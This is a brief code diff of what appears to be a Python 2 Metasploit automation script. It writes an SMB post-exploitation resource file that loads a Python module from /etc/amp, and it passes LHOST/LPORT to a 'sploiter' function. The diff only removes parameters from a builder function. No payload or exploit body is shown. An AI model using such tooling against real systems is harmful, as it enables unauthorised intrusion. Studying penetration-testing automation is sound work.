@@ -1,8 +1,8 @@
 import os, msfrpc, optparse, sys, subprocess
 from time import sleep
  
-# Function to create the MSF .rc files
-def builder(LHOST, LPORT):
+# GATHER OUR AMP LOCATION AND HASH
+def builder():
      post = open('/tmp/smbpost.rc', 'w')
      postcomms = """load python
 python_import -f /etc/amp/apf2.py
@@ -128,7 +128,7 @@ def main():
                 print parser.usage
                 sys.exit(0)
  	RHOST = ''
-        builder(LHOST, LPORT)
+        builder()
         sploiter(LHOST, LPORT, session)
  
 if __name__ == "__main__":
